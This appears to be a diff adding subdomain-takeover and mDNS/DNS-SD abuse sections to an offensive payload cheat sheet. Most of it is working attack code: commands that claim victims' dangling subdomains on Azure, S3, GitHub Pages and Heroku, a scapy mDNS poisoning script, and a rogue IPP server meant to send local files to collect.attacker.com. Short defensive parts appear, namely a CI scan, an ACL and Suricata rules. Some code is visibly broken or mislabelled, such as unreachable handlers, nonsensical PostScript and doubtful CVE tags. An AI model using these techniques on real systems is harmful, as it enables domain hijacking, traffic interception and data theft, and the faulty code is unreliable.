+dig REPLACE_WITH_YOUR_DOMAIN CNAME +noall +answer
+for sub in www mail dev staging api admin; do
+    echo "=== $sub ==="
+    dig ${sub}.REPLACE_WITH_YOUR_DOMAIN CNAME +short
+done
+
+# Step 2: find dangling CNAMEs (CNAME set but A returns NXDOMAIN or provider fingerprint)
+cat > cnames.txt << 'EOF'
+blog.example.com    -> ghost-example.herokuapp.com
+old.example.com     -> example-site.s3.amazonaws.com
+docs.example.com    -> exampledocs.netlify.app
+dev.example.com     -> exampledev.azurewebsites.net
+static.example.com  -> example.github.io
+EOF
+
+# Step 3: test each CNAME target for availability
+while read cname arrow target; do
+    [ "$arrow" = "->" ] || continue
+    echo -n "$cname -> $target : "
+    if ! dig +short $target A | grep -q .; then
+        echo "DANGLING (no A record)"
+    fi
+    curl -s -o /dev/null -w 'http=%{http_code} ' "http://${target}/"
+    curl -sk -o /dev/null -w 'https=%{http_code}\n' "https://${target}/"
+done < cnames.txt
+```
+
+### NXDOMAIN Provider Fingerprints
+
+```python
+#!/usr/bin/env python3
+"""Provider fingerprint table for detecting dangling CNAMEs.
+
+Each cloud provider returns a specific fingerprint when a resource is
+deprovisioned but the DNS still points at the provider. Match against
+HTTP response body / status to identify the responsible provider.
+"""
+PROVIDER_FINGERPRINTS = {
+    "azure": {
+        "domains": ["azurewebsites.net", "cloudapp.net", "trafficmanager.net",
+                    "blob.core.windows.net", "azureedge.net"],
+        "status": [404],
+        "body": r"No such app|404 Web Site not found|The resource you are looking for",
+    },
+    "aws_s3": {
+        "domains": ["s3.amazonaws.com", "s3-website-*.amazonaws.com"],
+        "status": [404],
+        "body": r"The specified bucket does not exist|NoSuchBucket",
+    },
+    "github_pages": {
+        "domains": ["github.io"],
+        "status": [404],
+        "body": r"There isn't a GitHub Pages site here",
+    },
+    "heroku": {
+        "domains": ["herokuapp.com", "herokussl.com"],
+        "status": [404],
+        "body": r"No such app|herokucdn",
+    },
+    "shopify": {
+        "domains": ["myshopify.com"],
+        "status": [404],
+        "body": r"Sorry, this shop is currently unavailable",
+    },
+    "fastly": {
+        "domains": ["fastly.net"],
+        "status": [500, 404],
+        "body": r"Fastly error: unknown domain",
+    },
+    "google_cloud_storage": {
+        "domains": ["c.storage.googleapis.com", "storage.googleapis.com"],
+        "status": [404],
+        "body": r"The specified bucket does not exist|NoSuchBucket",
+    },
+    "zendesk": {
+        "domains": ["zendesk.com"],
+        "status": [404],
+        "body": r"Help Center Closed",
+    },
+    "tumblr": {
+        "domains": ["tumblr.com"],
+        "status": [404],
+        "body": r"Whatever you were looking for doesn't currently exist",
+    },
+}
+
+import re, requests
+def fingerprint(url):
+    try:
+        r = requests.get(url, timeout=8, allow_redirects=False)
+    except Exception as e:
+        return None
+    for prov, fp in PROVIDER_FINGERPRINTS.items():
+        if r.status_code in fp["status"] and re.search(fp["body"], r.text):
+            return prov
+    return None
+```
+
+### Automated Scanning: subjack, subzy, nuclei
+
+```bash
+# subjack - classic subdomain takeover scanner
+subjack -w subdomains.txt -t 50 -timeout 30 \
+         -ssl -c /opt/subjack/fingerprints.json \
+         -o subjack_results.txt
+
+# subzy - Go-based, more up-to-date fingerprints
+subzy run --targets subdomains.txt --timeout 30 --concurrency 50 \
+         --hide_fails -o subzy_results.json
+
+# nuclei with takeover templates
+nuclei -l subdomains.txt -t /opt/nuclei-templates/takeovers/ \
+       -severity high,critical -o nuclei_takeover.txt
+
+# Filter to only confirmed takeovers
+grep -E 'takeover|vulnerable|dangling' subjack_results.txt \
+                                subzy_results.json nuclei_takeover.txt
+```
+
+### Proof-of-Concept HTML Per Provider
+
+```html
+<!-- Azure Web Apps takeover: register a free App Service and add the domain -->
+<!DOCTYPE html>
+<html><head><title>Azure takeover PoC</title></head>
+<body>
+<h1>blog.example.com (Azure Web Apps takeover)</h1>
+<p>This page is served from a victim subdomain that was left dangling.
+   Attacker re-registered exampleblog.azurewebsites.net and bound
+   blog.example.com via Azure custom domain verification.</p>
+<p>Served from: <script>document.write(window.location.hostname)</script></p>
+</body></html>
+```
+
+```bash
+# Azure Web Apps - bind the victim subdomain
+az webapp config hostname add \
+    --resource-group REPLACE_WITH_RG \
+    --webapp-name exampleblog \
+    --hostname blog.example.com
+
+# Verify TXT record ownership path (Azure checks asuid.<subdomain>)
+echo "Add TXT asuid.blog.example.com = <deployment-id>"
+```
+
+```html
+<!-- AWS S3 bucket takeover PoC -->
+<!DOCTYPE html>
+<html><head><title>S3 takeover PoC</title></head>
+<body>
+<h1>old.example.com (S3 bucket takeover)</h1>
+<p>Bucket name 'old.example.com' was released. Re-create it in any AWS
+   account, enable static website hosting, and the victim subdomain now
+   serves attacker-controlled content.</p>
+</body></html>
+```
+
+```bash
+# AWS S3 - re-create the bucket with the exact victim hostname
+aws s3api create-bucket \
+    --bucket old.example.com \
+    --region REPLACE_WITH_REGION \
+    --create-bucket-configuration LocationConstraint=REPLACE_WITH_REGION
+
+aws s3api put-bucket-website \
+    --bucket old.example.com \
+    --website-configuration file://website.json
+
+cat > website.json << 'EOF'
+{
+  "IndexDocument": {"Suffix": "index.html"},
+  "ErrorDocument": {"Key": "error.html"}
+}
+EOF
+
+aws s3 cp index.html s3://old.example.com/ --acl public-read
+```
+
+```html
+<!-- GitHub Pages takeover PoC -->
+<!DOCTYPE html>
+<html><head><title>GitHub Pages takeover PoC</title></head>
+<body>
+<h1>static.example.com (GitHub Pages takeover)</h1>
+<p>Create a repo named exactly <code>static.example.com</code>, enable
+   Pages, and the victim subdomain serves your content.</p>
+</body></html>
+```
+
+```bash
+# GitHub Pages - create repo matching the victim hostname, enable Pages
+gh repo create static.example.com --public --clone
+cd static.example.com
+echo "<h1>PoC</h1>" > index.html
+git add . && git commit -m "pages" && git push origin main
+gh api -X POST /repos/REPLACE_WITH_USER/static.example.com/pages \
+       -f source[branch]=main -f source[path]=/
+```
+
+### Heroku Takeover
+
+```bash
+# Heroku: re-create app with the dangling CNAME name
+heroku create ghost-example --region us
+heroku domains:add blog.example.com --app ghost-example
+heroku ps:scale web=1 --app ghost-example
+git push heroku main
+```
+
+### Continuous Monitoring (CI)
+
+```yaml
+# .github/workflows/subdomain-takeover.yml - schedule daily scan
+name: Subdomain Takeover Scan
+on:
+  schedule:
+    - cron: '17 6 * * *'  # daily 06:17 UTC, off-peak minute
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Subdomain enumeration
+        run: |
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          subfinder -d example.com -all -silent -o subs.txt
+      - name: Takeover scan
+        run: |
+          go install github.com/LukaSikic/subzy/v2/cmd/subzy@latest
+          subzy run --targets subs.txt --output subzy.json
+      - name: Alert on new takeovers
+        run: |
+          if grep -q '"vulnerable": true' subzy.json; then
+            echo "::error::Subdomain takeover detected"
+            exit 1
+          fi
+```
+
+---
+
+## 25. DNS-SD / mDNS Abuse Payloads
+
+DNS Service Discovery (DNS-SD) and multicast DNS (mDNS) power Bonjour (macOS), Avahi (Linux), and a huge fleet of IoT devices. They run on the link-local multicast address 224.0.0.251:5353 (IPv4) / ff02::fb (IPv6) and are trusted by default. Abuse ranges from passive fingerprinting to active poisoning of printer/AirPlay/Chromecast sessions.
+
+### Passive mDNS Reconnaissance
+
+```bash
+# Passively listen for mDNS announcements on the local segment
+# Capture 60 seconds of mDNS traffic on the .local multicast
+sudo timeout 60 tcpdump -i eth0 -w mdns.pcap 'udp port 5353'
+
+# Parse announcements
+tshark -r mdns.pcap -Y 'dns.flags.response==1' \
+       -T fields -e dns.qry.name -e dns.a -e source \
+       | sort -u
+
+# Service types to look for (DNS-SD _services._dns-sd._udp.local)
+for svc in _airplay._tcp _googlecast._tcp _ipp._tcp _ipps._tcp _printer._tcp \
+           _http._tcp _ssh._tcp _smb._tcp _raop._tcp _uscan._tcp _scanner._tcp \
+           _pdl-datastream._tcp _nfcid._tcp _workstation._tcp _device-info._tcp; do
+    echo "=== $svc ==="
+    dns-sd -B ${svc%%.*} local. 2>&1 | head -10
+done
+```
+
+### Active Service Enumeration
+
+```bash
+# Browse for a specific service type across the local segment
+avahi-browse -a -r -t
+avahi-browse -rt _airplay._tcp
+avahi-browse -rt _ipp._tcp
+avahi-browse -rt _googlecast._tcp
+
+# Resolve a specific instance to host/IP/port
+avahi-resolve -n printer.local
+avahi-resolve -n chromecast-b1234.local
+
+# Use dns-sd on macOS
+dns-sd -B _airplay._tcp local.
+dns-sd -L "Office Printer" _ipp._tcp local.
+```
+
+### mDNS Spoofing (Responder-style)
+
+```bash
+# Use Responder to poison WPAD / file-share queries over LLMNR/NBT-NS/mDNS
+sudo responder -I eth0 -wrfv
+
+# Targeted mDNS poisoning with a custom tool
+sudo python3 - << 'PYEOF'
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff
+from scapy.layers.dns import DNS
+import socket, struct
+
+IFACE = "eth0"
+SPOOF_IP = "10.0.0.250"   # attacker
+
+def poison(pkt):
+    if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
+        return
+    qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
+    # Respond to any _ipp._tcp, _airplay._tcp, _googlecast._tcp lookup
+    if not any(s in qname for s in ("_ipp", "_airplay", "_googlecast", "_printer")):
+        return
+    # Build a mDNS response (multicast, port 5353)
+    resp = (IP(dst="224.0.0.251") / UDP(sport=5353, dport=5353) /
+            DNS(id=0, qr=1, aa=1, qd=pkt[DNSQR],
+                an=DNSRR(rrname=pkt[DNSQR].qname, type="A",
+                          rdata=SPOOF_IP, ttl=120)))
+    send(resp, iface=IFACE, verbose=0)
+    print(f"[+] poisoned {qname} -> {SPOOF_IP}")
+
+sniff(iface=IFACE, filter="udp port 5353", prn=poison, store=0)
+PYEOF
+```
+
+### IPP Printer Hijack (CVE-2023-1981-style)
+
+```bash
+# Many network printers expose IPP (internet printing protocol) without
+# authentication. After mDNS poisoning, victims print to attacker-controlled
+# IPP server which can:
+#   - capture print jobs (potential data exfil)
+#   - send PostScript that reads ~/.ssh or environment
+#   - send firmware-update PJL commands
+
+cat > fake_ipp.py << 'PYEOF'
+#!/usr/bin/env python3
+"""Minimal malicious IPP listener. Captures print jobs and replies with
+embedded PostScript that exfiltrates local files via /urlEncodedPut."""
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import binascii
+
+EXFIL_URL = "https://collect.attacker.com/loot"
+
+MALICIOUS_POSTSCRIPT = f"""
+%!PS
+(userinfo) (w) file
+/want (SHELL) def
+% Read /etc/passwd-equivalent and POST to attacker
+(/etc/passwd) (r) file
+100 string readline pop
+{EXFIL_URL} (w) url
+"""  # lab skeleton - real payloads vary per firmware
+
+class IPPHandler(BaseHTTPRequestHandler):
+    def do_post(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length)
+        with open("/tmp/captured_job.bin", "ab") as f:
+            f.write(body)
+        # Send back a print job that embeds malicious PostScript
+        resp = (b"IPP/1.1 200 OK\r\n"
+                b"Content-Type: application/ipp\r\n\r\n"
+                + b"\x01"  # IPP version
+                + b"\x00\x00\x00\x00"  # status ok
+                + MALICIOUS_POSTSCRIPT.encode())
+        self.wfile.write(resp)
+    def do_get(self):
+        self.do_post()
+
+HTTPServer(("0.0.0.0", 631), IPPHandler).serve_forever()
+PYEOF
+
+sudo python3 fake_ipp.py &
+# Advertise it via mDNS poisoning (above)
+```
+
+### AirPlay Session Interception
+
+```bash
+# AirPlay uses _airplay._tcp.local for discovery and a separate RTSP /
+# HTTP session for streaming. Poisoning the announcement redirects the
+# victim's screen mirror or audio stream to the attacker.
+
+# Capture AirPlay handshake
+sudo tcpdump -i eth0 -w airplay.pcap 'tcp port 7000 or tcp port 7100'
+
+# Advertise a fake AppleTV
+avahi-publish -s "Living Room" _airplay._tcp 7000 \
+    "deviceid=AA:BB:CC:DD:EE:FF" \
+    "model=AppleTV3,2" \
+    "srcvers=220.68" \
+    "pw=false" \
+    "flags=0x4"
+
+# Mirror-receiver skeleton - accepts RTSP SETUP and dumps video
+# (real tooling: AirPlayer, UxPlay). Detect RTSP:
+tshark -r airplay.pcap -Y 'rtsp' -T fields \
+       -e rtsp.request -e rtsp.url | head
+```
+
+### Chromecast Protocol mDNS Abuse
+
+```bash
+# Chromecast/Google Home advertise _googlecast._tcp.local. Hijacking
+# allows attacker to control playback, set the device name, or trigger
+# factory reset. The CASTV2 protocol is a TLS channel on port 8009.
+
+# Discover Chromecasts
+avahi-browse -rt _googlecast._tcp | grep -E 'ipv4|txt'
+
+# Cast a YouTube video without authentication (CADEVE 2019 / Guest mode)
+python3 - << 'PYEOF'
+import pychromecast
+chromecasts, browser = pychromecast.get_listed_chromecasts(
+    friendly_names=["Living Room TV"])
+if chromecasts:
+    cast = chromecasts[0]
+    cast.wait()
+    mc = cast.media_controller
+    mc.play_media("https:// REPLACE_WITH_YOUR_VIDEO_MP4", "video/mp4")
+PYEOF
+
+# Spoof a Chromecast to capture cast sessions
+avahi-publish -s "Living Room TV" _googlecast._tcp 8009 \
+    "id=0000000000000000000000c1d2e3f4" \
+    "cd=CAE=" \
+    "rm=" \
+    "ve=05" \
+    "md=Chromecast" \
+    "ic=/setup/icon.png" \
+    "fn=LivRoom" \
+    "ca=200709" \
+    "st=0" \
+    "nf=1" \
+    "rs="
+```
+
+### Defense and Detection (DNS-SD / mDNS)
+
+```bash
+# Block mDNS at the network boundary - never let 224.0.0.251 cross VLANs
+# Cisco IOS:
+#   ip multicast-routing
+#   interface Vlan10
+#    no ip igmp join-group 224.0.0.251
+#    ip access-group NO-MDNS in
+#   ip access-list extended NO-MDNS
+#    deny udp any host 224.0.0.251 eq 5353
+#    permit ip any any
+
+# Suricata rule: alert on mDNS responses advertising an unexpected IP
+cat > /etc/suricate/rules/mdns.rules << 'EOF'
+alert udp $HOME_NET any -> 224.0.0.251 5353 (msg:"mDNS announcement outbound"; \
+    sid:9000001; rev:1;)
+alert udp any 5353 -> $HOME_NET any (msg:"mDNS response with external IP"; \
+    dns.query; content:"."; \
+    sid:9000002; rev:1;)
+EOF
+
+sudo suricata -c /etc/suricata/suricata.yaml -S /etc/suricate/rules/mdns.rules \
+              -i eth0 -l /var/log/suricata
+```
+
